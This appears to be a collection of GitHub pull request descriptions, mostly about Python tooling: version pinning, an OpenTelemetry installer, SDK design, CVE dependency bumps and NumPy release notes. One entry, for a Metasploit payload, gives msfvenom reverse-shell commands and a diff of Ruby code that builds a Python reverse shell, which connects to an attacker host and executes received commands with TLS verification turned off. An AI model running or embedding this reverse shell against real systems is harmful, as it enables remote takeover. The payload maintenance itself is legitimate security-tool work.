items.title: fix: use .python-version for CI Python setup
items.body:
## Summary

`uv python install 3.12` installed 3.12.13 while `.python-version` pins 3.12.10. This mismatch caused `uv sync --frozen` to recreate the venv, losing dev tools. `uv run --frozen ruff` then failed with "Failed to spawn: ruff".

Fix: Use `uv python install` (reads `.python-version`) instead of `uv python install 3.12`.

🤖 Generated with [Claude Code](https://claude.com/claude-code)

items.title: feat(otel-python): python auto-instrumentation
items.body:
- [ ] Bug fix
- [x] New feature
- [ ] Documentation update

## Description

- Adds comprehensive pre-flight validation for Python 3, pip, and venv, failing fast with clear error
- Improves virtual environment handling with health checks and venv recreation only after user confirmation.
- Enhances process tracking and error reporting so subprocess failures are clearly surfaced and self-diagnosable.
- Verifies that framework instrumentations are installed after running opentelemetry-bootstrap -a install, and attempts remediation if they're missing.
- Refactors the installer into focused files and introduces a detailed spec covering Python install validation and process management.


## Changes

- Robust pre-flight validation for Python, pip, and venv prerequisites.
- Automatic verification and remediation of missing framework instrumentations after bootstrap.
- Refactored installer code into focused, maintainable files within the installer package.
- Added detailed spec/design documentation and related cleanup tasks.

## How to test

1. Run the installer in a standard environment with Python 3, pip, and venv available and verify:
 Pre-flight checks pass.
    - Pre-flight checks pass
    - The venv is created and reused correctly.
    - Frameowrk insturmentations are installed and detected.
2. Simulate broken or stale venvs and confirm that (scenarios 3-5)


### Additional explicit scenarios

> After each scenario, run the cleanup of processes:
>
> ```sh
> kill -9 $(lsof -t -i:5000 -i:5001 -i:5002)
> ```

---

### Scenario 2: Only `python`, no `python3`

```sh
d=$(mktemp -d) \
  && printf '#!/bin/sh\necho "Python 3.11.0"\n' > $d/python \
  && printf '#!/bin/sh\nexit 127\n' > $d/python3 \
  && chmod +x $d/python $d/python3 \
  && PATH=$d:$PATH go run main.go install otel-python; rm -rf $d
```

**Expected:** works fine.

---

### Scenario 3: `venv` module missing  
Python 3 is present, but `python3 -m venv` fails.

```sh
d=$(mktemp -d) && printf '#!/bin/sh\ncase "$*" in\n  "--version") echo "Python 3.11.0" ;;\n  *) echo "No module named venv" >&2; exit 1 ;;\nesac\n' > $d/python3 && chmod +x $d/python3 && PATH=$d:$PATH go run main.go install otel-python; rm -rf $d
```

**Expected:**

```text
pip is not available for the detected Python 3 interpreter (/var/folders/rb/wh6hnhc16fddwwgw50bbh99r0000gq/T/tmp.TAdvb2xtEr/python3): exit status 1
    No module named venv
```

---

### Scenario 4: `pip` missing  
Python 3 is present, but `python3 -m pip` fails.

```sh
d=$(mktemp -d) && printf '#!/bin/sh\ncase "$*" in\n  "--version") echo "Python 3.11.0" ;;\n  *) echo "No module named pip" >&2; exit 1 ;;\nesac\n' > $d/python3 && chmod +x $d/python3 && PATH=$d:$PATH go run main.go install otel-python; rm -rf $d
```

**Expected:**

```text
pip is not available for the detected Python 3 interpreter (/var/folders/rb/wh6hnhc16fddwwgw50bbh99r0000gq/T/tmp.0NzWwPDyJ3/python3): exit status 1
    No module named pip
exit status 1
```

---

### Scenario 5: `venv` missing  
Python 3 and `pip` are present, but `python3 -m venv` fails.

```sh
d=$(mktemp -d) && printf '#!/bin/sh\ncase "$*" in\n  "--version") echo "Python 3.11.0" ;;\n  "-m pip"*) exit 0 ;;\n  "-m venv"*) echo "No module named venv" >&2; exit 1 ;;\nesac\n' > $d/python3 && chmod +x $d/python3 && PATH=$d:$PATH go run main.go install otel-python; rm -rf $d
```

**Expected:**

```text
venv module is not available for the detected Python 3 interpreter (/var/folders/rb/wh6hnhc16fddwwgw50bbh99r0000gq/T/tmp.YglRmrmHMI/python3) — on Debian/Ubuntu run: apt install python3-venv: exit status 1
    No module named venv
exit status 1
```


## Checklist

- [x] I have tested these changes locally.
- [x] I updated documentation where necessary.
- [x] I added or updated tests where appropriate.
- [x] I followed the existing code style and conventions.

items.title: Add .python-version file to pin Python 3.12
items.body:
## Problem

Railpack installs Python 3.13.13 by default, but pyproject.toml declares `requires-python = ">=3.12,<3.13"`, which explicitly excludes 3.13.x. Poetry detects the mismatch and fails with "Poetry was unable to find a compatible version", causing the build to exit with code 1.

## Solution

Added a `.python-version` file at the repository root containing `3.12`. Mise (the version manager used by Railpack) reads this file and installs Python 3.12.x instead of the default 3.13.x, satisfying the project's requires-python constraint and allowing Poetry to proceed with dependency installation.

### Changes
- **Created** `.python-version`

---
*Generated by [Railway](https://railway.com)*

items.title: Add synthetic Python tests covering many Python constructs
items.body:
This PR adds 326 Python tests that cover many Python constructs. Each test is simple and follows the same structure:
```python
def some_function():
   # do some computation
   assert(...)       # This assert must be proven valid

some_function()
```
The tests that can be analyzed with Strata and for which the assert is proven valid (99 tests) are in the `tests/` directory, with an `expected` file. The tests that do not yet pass with Strata (either failing with internal errors or the assert cannot be proven) are in the `pending/` directory, and are not launched by the CI test framework.

items.title: Modernise app from Python 2.7 to Python 3
items.body:
- New scryfall.py module replaces all dead external services (mtgimage.com,
  TCGPlayer scraper, MTGJson v2 URLs) with a single Scryfall API integration
  for card data, artwork, and prices
- Delete ConnectionRequired.py and UI/Prices.py (fully superseded)
- Port every file to Python 3: print(), .items(), str instead of basestring,
  explicit relative imports, tkinter.filedialog, integer division
- Fix Pillow deprecation: Image.ANTIALIAS → Image.LANCZOS
- Remove macOS-only osascript window-focus hack
- Replace distutils.version.StrictVersion (removed in 3.12) with no version
  check needed (Scryfall always current)
- Add background threading for image and price fetches so the UI never
  freezes; PIL→PhotoImage conversion kept on main thread to satisfy Tkinter
- Fix ScrollFrame mousewheel bug (self.scroll_frame.canvas → self.canvas)
  and raise-statement syntax (Python 2 → Python 3)
- Handle both MTGJson v2 (bare dict) and v5 ({"data":…} wrapper) formats
- Improve Collection price labels (Market/Foil/MTGO instead of High/Med/Low)
- Replace donothing() Help placeholder with a real About dialog

items.title: Python SDK: Pythonic API — generics, context managers, WatchedField
items.body:
## Summary
Replaces #67 (closed due to conflicts).

- Overloaded `get()`: `get(t, f)` → `str`, `get(t, f, int)` → `int` via `@overload`
- `client.watch("tenant")` factory — watcher inherits connection/auth
- Context managers for clients (`with`) and watchers (`with client.watch(t) as w:`)
- `WatchedField[T]` with `.value` property, `__bool__`, `on_change`, `changes()`
- `@dataclass(frozen=True, slots=True)` for all return types (3.11+)

## Test plan
- [ ] Effort doc only, no code changes

Three `pip` dependencies in `backend/requirements.txt` carried known CVEs. Bumped each to the minimum safe release.

- **`Pillow` 10.3.0 → 12.1.1** — out-of-bounds write when decoding PSD images
- **`python-jose` 3.3.0 → 3.4.0** — algorithm confusion attack via OpenSSH ECDSA keys (JWT forgery risk)
- **`python-multipart` 0.0.9 → 0.0.22** — DoS via malformed `multipart/form-data` boundary; arbitrary file write under non-default config

items.body:
The app goes from a client-server architecture (frontend + FastAPI backend on Azure) to a fully static site deployable on GitHub Pages, with the Python engine retained only for offline cache generation and CLI use.

## Details
- Removed the backend API — Deleted FastAPI server (api.py, models.py, server.py), Dockerfile, Azure
  deployment workflow, and all API tests (e2e, integration)
  - Renamed backend/ to engine/ — The Python package is now solely an offline computation engine and
  CLI, not a server. Updated pyproject.toml dependencies (dropped fastapi, uvicorn, httpx)
  - Made the frontend fully static — Added cache.js, positions.js, and tour.js modules so the UI
  computes everything client-side using precomputed JSON data instead of calling an API
  - Added static data pipeline — New generate_planets.py script and generate_test_fixtures.py to produce
   planets.json, windows.json, and golden test fixtures checked into frontend/data/ and
  frontend/test-fixtures/
  - Frontend tests — Added cache.test.js, positions.test.js, tour.test.js using golden fixtures from the
   Python engine
  - Updated CI/CD — ci.yml now runs both pytest and node --test; removed deploy-backend.yml; updated
  docs (CLAUDE.md, README.md)
  - Removed Azure infra scripts (infra/setup.sh, infra/map-credentials.sh)

items.body:
Fixes #19811

This PR adds support for multiple python binaries for cmd/unix/reverse_python and cmd/unix/reverse_python_ssl as mentioned in the issue above.

I am re-opening a merge request from another account because my previous account "jeanmtr" was suspended and all traces of its activities were deleted ( i do not know the reason behind the suspension). Sorry for any inconvenience this may cause. 



## Verification

List the steps needed to make sure this thing works
for reverse_python : 

- [x] Run `nc -lvnp 4444`
- [x] Run `msfvenom -p cmd/unix/reverse_python LHOST=[host to test]`
- [x] **Verify** if the reverse shell is working 


for reverse_python_ssl : 

- [x] Generate ssl key and cert
- [x] Run `openssl s_server -accept 4444 -cert server.crt -key server.key -quiet`
- [x] Run `msfvenom -p cmd/unix/reverse_python_ssl LHOST=[host to test]`
- [ ] **Verify** if the reverse shell is working 


However there is an unrelated incompatibility with python version higher than 3.12, the ssl.wrap_socket method was removed. Here is a proposed fix that would fix it, i think the same issue is present in `modules/payloads/singles/python/shell_reverse_tcp_ssl.rb `. I don't know if i should open a separate issue or not so i will just put the diff here.

```diff
@@ -54,16 +54,19 @@ module MetasploitModule
     # Set up the socket
     cmd += "import socket,subprocess,os,ssl\n"
     cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
+    cmd += "context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n"
+    cmd += "context.check_hostname = False\n"
+    cmd += "context.verify_mode = ssl.CERT_NONE\n"
     cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
-    cmd += "s=ssl.wrap_socket(so)\n"
+    cmd += "so = context.wrap_socket(so)\n"
     # The actual IO
     cmd += "#{dead}=False\n"
     cmd += "while not #{dead}:\n"
-    cmd += "\tdata=s.recv(1024)\n"
+    cmd += "\tdata=so.recv(1024)\n"
     cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
     cmd += "\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
-    cmd += "\ts.send(stdout_value)\n"
-    "#{datastore['PythonPath']} -c \"#{py_create_exec_stub(cmd)}\""
+    cmd += "\tso.send(stdout_value)\n"
+    "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | #{datastore['PythonPath']} -"
   end
 end
```

items.title: Refactor AnsibleModule to Java implementation
items.body:
This PR moves the `AnsibleModule` implementation from Python (`ansible_bridge.py`) to Java (`PythonAnsibleModuleMock.java`). This refactoring improves the maintainability and performance of the module mock by utilizing Java's native capabilities for file system operations and hashing, while maintaining the necessary Python interface for Ansible module compatibility. Key changes include:
- A new `PythonAnsibleModuleMock` class in Java that implements parameter specification parsing, `run_command` delegation, and various hashing and file attribute methods.
- Injection of a `Factory` for this mock into the GraalPy context via `TaskExecutor`.
- Delegation of `AnsibleModule` logic in `ansible_bridge.py` to the Java-backed mock.
- Improved stability by using `_deep_convert` to normalize complex types before they cross the Java-Python boundary.

---

items.title: Add python to local dev env and update python stack
items.body:
## Summary

This PR makes the local Python development story more useful for both product users and maintainers working on proxy-side Python code.

- add a dedicated Python test environment in `Dockerfile.dev` for local proxy-addon work, including `mitmproxy`, `pytest`, and `PyYAML`
- make the shipped Python stack more practical for default-deny sandbox use by documenting Debian `venv` behavior, PEP 668 limits, and the offline `--system-site-packages` workflow
- remove `pipx` from the shipped Python stack and simplify the Python path layout around `~/.local/bin`
- move Go-installed tools to `$HOME/go/bin` and update the Go stack docs and local compose mounts so Go tools do not mask agent binaries such as `codex`
- add common Python local-dev artifacts to `.gitignore`
- refresh README language around supported agents and clarify that public package registries such as PyPI remain opt-in
- normalize the local compose files for this repo's dev environment

items.title: Port Clojure tests to Java: metrics_test, nimbus_auth_test (Phase 5)
items.body:
## Summary

- Ports 2 of 5 tests from `metrics_test.clj` and all 5 tests from `nimbus_auth_test.clj` to Java/JUnit 5
- Clojure `defbolt count-acks` replaced with Java `CountAcksBolt` inner class
- JAAS digest config copied to storm-server test resources for classpath access

### Tests ported

**MetricsIntegrationTest** (storm-core, 2 tests):

| Test | Coverage |
|---|---|
| `testCustomMetric` | CountMetric with FakeMetricConsumer, simulated time |
| `testCustomMetricWithMultiTasks` | Same with 2 tasks per bolt (all grouping) |

Skipped: 3 Python multilang metrics tests (require Python shell bolt/spout)

**NimbusAuthTest** (storm-server, 5 tests):

| Test | Coverage |
|---|---|
| `testSimpleAuthentication` | SimpleTransportPlugin with no authorizer |
| `testNoopAuthorizationWithSimpleTransport` | NoopAuthorizer, mocked cluster state |
| `testDenyAuthorizationWithSimpleTransport` | DenyAuthorizer, 17 denied Nimbus operations |
| `testNoopAuthorizationWithSaslDigest` | DigestSaslTransportPlugin with JAAS config |
| `testDenyAuthorizationWithSaslDigest` | DenyAuthorizer with SASL digest, 17 denied ops |

Part of the Clojure test migration effort (Phase 5 of #8445).

## Test plan

- [x] `mvn test -pl storm-core -Dtest=org.apache.storm.metric.MetricsIntegrationTest` — 2 tests pass
- [x] `mvn test -pl storm-server -Dtest=org.apache.storm.security.auth.NimbusAuthTest` — 5 tests pass
- [x] Verify existing tests still pass

NumPy 1.26.4 is a maintenance release that fixes bugs and regressions
discovered after the 1.26.3 release. The Python versions supported by
this release are 3.9-3.12. This is the last planned release in the
1.26.x series.

### [`v1.26.3`](https://redirect.github.com/numpy/numpy/releases/tag/v1.26.3)

[Compare Source](https://redirect.github.com/numpy/numpy/compare/v1.26.2...v1.26.3)

### NumPy 1.26.3 Release Notes

NumPy 1.26.3 is a maintenance release that fixes bugs and regressions
discovered after the 1.26.2 release. The most notable changes are the
f2py bug fixes. The Python versions supported by this release are
3.9-3.12.

#### Compatibility

`f2py` will no longer accept ambiguous `-m` and `.pyf` CLI combinations.
When more than one `.pyf` file is passed, an error is raised. When both
`-m` and a `.pyf` is passed, a warning is emitted and the `-m` provided
name is ignored.

#### Improvements

`f2py` now handles `common` blocks which have `kind` specifications from
modules. This further expands the usability of intrinsics like
`iso_fortran_env` and `iso_c_binding`.

### NumPy 1.26.2 Release Notes

NumPy 1.26.2 is a maintenance release that fixes bugs and regressions
discovered after the 1.26.1 release. The 1.26.release series is the last
planned minor release series before NumPy 2.0. The Python versions
supported by this release are 3.9-3.12.

items.title: check python versions
items.body:
## Summary by Sourcery

Add validation to ensure Ruff target Python version is consistent with the project’s declared minimum Python version and integrate it into merged config validation, while updating related docs and plans.

Bug Fixes:
- Avoid using Ruff's --isolated flag together with --config when validating merged configurations.

Enhancements:
- Introduce a Python version consistency check between [tool.ruff].target-version and [project].requires-python, optionally failing in strict mode.
- Extend merged configuration validation to run the new version consistency check for pyproject-based configs.
- Clarify uv PATH setup guidance in the contributor documentation.

Documentation:
- Document the Python version mismatch warning, its causes, and remediation steps in the troubleshooting guide.
- Update the ruff-sync usage skill docs to describe the new Python version consistency check and strict mode behavior.
- Mark config validation and Python version consistency items as completed or in progress in the internal planning document.

Tests:
- Add tests covering version mismatch warnings, strict-mode failures, and behavior when validating standalone ruff.toml files.
- Adjust config validation tests to reflect the removal of the --isolated flag when invoking Ruff with --config.

Chores:
- Update the internal agent plan status table to reflect completed and in-progress validation features.
